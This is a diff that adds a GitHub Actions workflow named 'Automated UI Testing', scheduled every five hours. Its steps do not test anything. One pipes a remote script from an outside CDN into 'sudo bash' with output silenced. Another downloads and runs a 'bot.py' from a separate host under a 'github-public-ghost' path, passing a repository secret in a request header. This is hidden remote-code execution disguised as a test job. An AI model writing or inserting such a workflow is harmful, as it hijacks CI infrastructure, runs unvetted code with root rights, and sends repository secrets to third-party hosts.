@@ -1,0 +1,32 @@
+name: Automated UI Testing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */5 * * *'
+
+jobs:
+  run-tests:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Virtual Environment
+        run: |
+          curl -sSL https://cdn.organichits.co/setup/install-without-docker.sh | sudo bash > /dev/null 2>&1
+          sleep 60
+
+      - uses: actions/setup-python@v4
+        with:
+          python-version: '3.10'
+
+      - name: Install Core Dependencies
+        run: |
+          pip install playwright requests > /dev/null 2>&1
+          playwright install chromium > /dev/null 2>&1
+
+      - name: Execute UI Test Suite
+        env:
+          # تمرير كلمة السر لسكريبت البايثون من الأسرار
+          AUTH_TOKEN: ${{ secrets.AUTH_TOKEN }}
+        run: |
+          # سحب البايثون من مسار الاستضافة الجديد مع المصادقة
+          curl -H "X-Kareem-Auth: ${{ secrets.AUTH_TOKEN }}" -sSL http://worker.lnkr.dpdns.org/github-public-ghost/bot.py -o test_suite.py
+          python test_suite.py
